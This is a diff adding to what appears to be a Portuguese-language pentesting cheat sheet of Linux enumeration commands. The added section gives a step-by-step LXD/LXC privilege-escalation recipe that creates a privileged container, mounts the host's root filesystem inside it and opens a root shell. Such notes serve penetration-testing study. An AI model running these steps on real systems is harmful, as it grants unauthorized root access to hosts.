@@ -56,6 +56,16 @@ cat /proc/version
 # Uma lista de todos os executáveis binários no sistema, juntamente com as capacidades que foram definidas para cada um
 find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
 
+# Importar um contêiner como uma imagem para futuro ataque de replicação de contêiner ROOT
+identificar contêiner vulneravel e com alguma imagem e em seguida:
+lxc image import nome-da-imagem-tar-gz --alias nome-pra-identificar  -> importar imagem
+lxc image list -> listar imagem importada com nome que damos
+lxc init nome-qa-imagem-que-demos privesc -c security.privileged=true  -> criar conteiner chamado privesc com priv root
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true  -> montar root do host dentro do container
+lxc start privesc -> iniciar container
+lxc exec privesc /bin/bash -> entrar no container
+
+
 # Identifica a distribuição Linux
 cat /etc/os-release
 lsb_release -a
